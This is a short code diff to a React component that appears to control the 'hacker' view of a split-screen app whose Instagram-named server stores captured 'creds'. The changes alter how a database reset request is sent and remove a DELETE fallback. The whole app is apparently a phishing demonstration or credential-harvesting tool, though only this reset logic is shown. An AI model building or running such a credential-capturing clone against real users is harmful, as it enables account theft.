@@ -545,22 +545,15 @@ const SplitIframeContent = ({
       try {
         // Try direct POST to /reset on the server
         const resetUrl = "https://instagram-hfmx.onrender.com/reset";
-        await fetch(resetUrl, { method: "POST" });
-        console.log("Database reset command sent.");
+        // Use no-cors mode to send the request even if we can't read the response
+        await fetch(resetUrl, { method: "POST", mode: "no-cors" });
+        console.log("Database reset command sent (no-cors).");
         setHackerData(""); // Clear local view immediately
-        fetchData(); // Fetch fresh data
+        
+        // Wait a bit for server to process before fetching fresh data
+        setTimeout(() => fetchData(), 500);
       } catch (e) {
         console.error("Reset failed", e);
-        // Fallback: try DELETE /creds
-        try {
-           const deleteUrl = "https://instagram-hfmx.onrender.com/creds";
-           await fetch(deleteUrl, { method: "DELETE" });
-           console.log("Database DELETE command sent.");
-           setHackerData("");
-           fetchData();
-        } catch (e2) {
-           console.error("DELETE failed too", e2);
-        }
       }
     };
     
